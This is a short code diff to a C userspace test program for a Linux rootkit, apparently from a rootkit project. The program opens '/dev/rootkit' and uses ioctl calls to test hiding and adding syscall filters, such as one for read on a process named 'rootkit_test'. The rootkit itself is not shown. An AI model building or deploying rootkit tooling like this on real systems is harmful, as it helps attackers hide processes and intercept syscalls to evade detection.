@@ -4,9 +4,15 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/ioctl.h>
+#include <sys/syscall.h>
 #include <unistd.h>
 
 const char *device = "/dev/rootkit";
+const char *proc_name = "rootkit_test";
+
+struct list_head {
+  struct list_head *next, *prev;
+};
 
 void test_hide() {
   int fd = open(device, O_RDWR);
@@ -70,8 +76,8 @@ void test_add_filter() {
   int fd = open(device, O_RDWR);
   struct filter_info info;
 
-  info.syscall_nr = __NR_read;
-  strncpy(info.comm, current->comm, TASK_FILTER_LEN);
+  info.syscall_nr = SYS_read;
+  strncpy(info.comm, proc_name, TASK_FILTER_LEN);
   info.comm[TASK_FILTER_LEN - 1] = '\0';
 
   printf("adding filter for read syscall... before\n");
